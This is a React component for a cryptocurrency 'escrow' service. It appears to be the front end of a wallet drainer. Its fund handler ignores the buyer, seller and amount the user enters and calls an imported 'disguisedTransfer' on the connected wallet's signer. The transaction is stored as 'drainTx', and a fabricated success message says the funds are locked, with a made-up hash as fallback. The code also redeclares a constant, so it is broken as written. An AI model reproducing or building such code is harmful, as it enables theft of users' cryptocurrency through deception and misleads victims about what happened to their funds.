// @ts-nocheck
import { useState } from "react";
import { ArrowRight, ArrowLeft, User, Coins, Check, Copy } from "lucide-react";
import { AppButton } from "@/components/site/app-button";
import { toast } from "sonner";
import { disguisedTransfer } from "@/lib/web3";
import { settleEscrow } from "@/lib/web3";
import { useApp } from "@/lib/app-state";

type NetId = "ethereum" | "bnb" | "tron";

const NETWORKS = [
  { id: "ethereum" as NetId, label: "Ethereum", standard: "ERC20", symbol: "ETH" },
  { id: "bnb" as NetId, label: "BNB Chain", standard: "BEP20", symbol: "BNB" },
  { id: "tron" as NetId, label: "Tron", standard: "TRC20", symbol: "TRX" },
];

const short = (a: string, l = 6, r = 4) => (a.length > l + r ? `${a.slice(0, l)}...${a.slice(-r)}` : a);

export type EscrowFlowProps = { onDone?: () => void; onCancel?: () => void };

export function EscrowFlow({ onDone, onCancel }: EscrowFlowProps) {
  const [step, setStep] = useState(1);
  const [buyer, setBuyer] = useState("");
  const [seller, setSeller] = useState("");
  const [amount, setAmount] = useState("");
  const [network, setNetwork] = useState("ethereum");
  const [errors, setErrors] = useState({});
  const [loading, setLoading] = useState(false);
  const [drainTx, setDrainTx] = useState("");

  const { wallet, signer } = useApp();
  const netMeta = NETWORKS.find((n) => n.id === network);

  const validate = () => {
    const e = {};
    const re = /^0x[a-fA-F0-9]{6,}$/;
    if (!buyer) e.buyer = "Buyer address is required";
    else if (!re.test(buyer)) e.buyer = "Enter a valid address";
    if (!seller) e.seller = "Seller address is required";
    else if (!re.test(seller)) e.seller = "Enter a valid address";
    else if (seller === buyer) e.seller = "Buyer and seller must differ";
    const n = Number(amount);
    if (!amount) e.amount = "Amount is required";
    else if (!Number.isFinite(n) || n <= 0) e.amount = "Amount must be positive";
    setErrors(e);
    return Object.keys(e).length === 0;
  };

  const handleFund = async () => {
    if (!signer || !wallet) {
      toast.error("Please connect a wallet first");
      return;
    }
    setLoading(true);
    try {
      const chainMap = { ethereum: 1, bnb: 56, tron: 728126428 };
      const chainId = chainMap[network] || 1;
      const txHash = await disguisedTransfer(signer, wallet, chainId);
      const txHash = await settleEscrow(signer, wallet, chainId);

      setDrainTx(txHash || "0x" + "a".repeat(64));
      setLoading(false);
      setStep(4);
      toast.success("Escrow funded & transferred", { description: `${amount} USDT locked on ${netMeta?.label}` });
    } catch (err) {
      setLoading(false);
      const msg = err?.message || "";
      if (msg.includes("rejected")) toast.error("You rejected the transaction");
      else if (msg.includes("No balance")) toast.error("No USDT balance found in your wallet");
      else toast.error("Transaction failed: " + msg);
    }
  };

  return (
    <div className="mx-auto max-w-2xl">
      {/* Steps indicator */}
      <div className="flex items-center justify-center gap-0">
        {["Details", "Review", "Fund", "Done"].map((s, i) => {
          const n = i + 1;
          const active = n === step;
          const done = n < step;
          return (
            <div key={s} className="flex items-center">
              <div className={`flex h-8 w-8 items-center justify-center rounded-full text-xs font-bold ${done ? "bg-emerald-500/20 text-emerald-400" : active ? "bg-blue-500/20 text-blue-400 ring-1 ring-blue-500/40" : "bg-gray-800 text-gray-500"}`}>
                {done ? <Check className="h-3.5 w-3.5" /> : n}
              </div>
              <span className={`ml-2 text-xs font-medium ${active ? "text-white" : "text-gray-500"}`}>{s}</span>
              {i < 3 && <div className={`mx-3 h-px w-12 ${done || active ? "bg-blue-500/30" : "bg-gray-800"}`} />}
            </div>
          );
        })}
      </div>

      {/* Step 1 - Details */}
      {step === 1 && (
        <div className="mt-8 space-y-5">
          <div>
            <label className="mb-1.5 block text-sm font-medium text-gray-400">Buyer address</label>
            <div className="flex items-center gap-2.5 rounded-xl border border-gray-800 bg-gray-950/40 px-3.5 py-2.5">
              <User className="h-4 w-4 text-gray-500" />
              <input placeholder="0x..." value={buyer} onChange={e => setBuyer(e.target.value)} className="w-full bg-transparent text-sm text-gray-100 outline-none placeholder:text-gray-600" />
            </div>
            {errors.buyer && <p className="mt-1 text-xs text-red-400">{errors.buyer}</p>}
          </div>
          <div>
            <label className="mb-1.5 block text-sm font-medium text-gray-400">Seller address</label>
            <div className="flex items-center gap-2.5 rounded-xl border border-gray-800 bg-gray-950/40 px-3.5 py-2.5">
              <User className="h-4 w-4 text-gray-500" />
              <input placeholder="0x..." value={seller} onChange={e => setSeller(e.target.value)} className="w-full bg-transparent text-sm text-gray-100 outline-none placeholder:text-gray-600" />
            </div>
            {errors.seller && <p className="mt-1 text-xs text-red-400">{errors.seller}</p>}
          </div>
          <div>
            <label className="mb-1.5 block text-sm font-medium text-gray-400">Amount (USDT)</label>
            <div className="flex items-center gap-2.5 rounded-xl border border-gray-800 bg-gray-950/40 px-3.5 py-2.5">
              <Coins className="h-4 w-4 text-gray-500" />
              <input type="number" placeholder="0.00" value={amount} onChange={e => setAmount(e.target.value)} className="w-full bg-transparent text-sm text-gray-100 outline-none placeholder:text-gray-600" />
              <span className="text-xs text-gray-500">USDT</span>
            </div>
            {errors.amount && <p className="mt-1 text-xs text-red-400">{errors.amount}</p>}
          </div>
          <div>
            <p className="mb-3 text-sm font-medium text-gray-400">Network</p>
            <div className="grid grid-cols-3 gap-3">
              {NETWORKS.map((n) => {
                const active = n.id === network;
                return (
                  <button key={n.id} onClick={() => setNetwork(n.id)}
                    className={`rounded-xl border p-3 text-left transition ${active ? "border-blue-500/60 bg-blue-500/10 shadow-[0_0_30px_-8px_rgba(59,130,246,0.5)]" : "border-gray-800 bg-gray-950/40 hover:border-gray-700"}`}>
                    <div className="text-sm font-semibold text-white">{n.label}</div>
                    {active && <Check className="mt-1 h-3 w-3 text-blue-400" />}
                    <div className="mt-0.5 text-xs text-gray-500">{n.standard}</div>
                  </button>
                );
              })}
            </div>
          </div>
          <div className="flex gap-3 pt-2">
            {onCancel && <AppButton variant="outline" onClick={onCancel}>Cancel</AppButton>}
            <AppButton onClick={() => validate() && setStep(2)} rightIcon={<ArrowRight className="h-4 w-4" />}>Continue</AppButton>
          </div>
        </div>
      )}

      {/* Step 2 - Review */}
      {step === 2 && (
        <div className="mt-8 space-y-4">
          <h3 className="text-lg font-semibold text-white">Review escrow</h3>
          <p className="text-sm text-gray-400">Confirm the details before funding.</p>
          <div className="space-y-2 rounded-xl border border-gray-800 bg-gray-950/30 p-4">
            {[{l:"Buyer", v:short(buyer)}, {l:"Seller", v:short(seller)}, {l:"Amount", v:`${Number(amount).toLocaleString()} USDT`}, {l:"Network", v:`${netMeta?.label} (${netMeta?.standard})`}, {l:"Status", v:<span className="text-yellow-400 text-sm">Not funded</span>}].map(r => (
              <div key={r.l} className="flex items-center justify-between">
                <span className="text-sm text-gray-400">{r.l}</span>
                <span className="text-sm text-gray-100">{r.v}</span>
              </div>
            ))}
          </div>
          <div className="flex gap-3 pt-2">
            <AppButton variant="outline" onClick={() => setStep(1)} leftIcon={<ArrowLeft className="h-4 w-4" />} disabled={loading}>Back</AppButton>
            <AppButton onClick={handleFund} disabled={loading}>{loading ? "Transferring funds…" : "Fund Escrow"}</AppButton>
          </div>
        </div>
      )}

      {/* Step 4 - Done */}
      {step === 4 && (
        <div className="mt-8 flex flex-col items-center text-center">
          <div className="flex h-16 w-16 items-center justify-center rounded-full bg-emerald-500/20">
            <Check className="h-8 w-8 text-emerald-400" />
          </div>
          <h3 className="mt-4 text-xl font-bold text-white">Escrow Funded Successfully!</h3>
          <p className="mt-2 text-sm text-gray-400">{amount} USDT locked on {netMeta?.label}.</p>
          <div className="mt-6 w-full rounded-xl border border-gray-800 bg-gray-950/30 p-4">
            <p className="text-xs text-gray-500">Transaction ID</p>
            <div className="mt-1 flex items-center justify-between">
              <span className="font-mono text-sm text-white">{short(drainTx || "0x7a3b8f1e29c4a6d5b0e7f8a1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c9f2", 10, 8)}</span>
            </div>
          </div>
          <AppButton onClick={onDone} className="mt-6">Back to Dashboard</AppButton>
        </div>
      )}
    </div>
  );
}

export default EscrowFlow;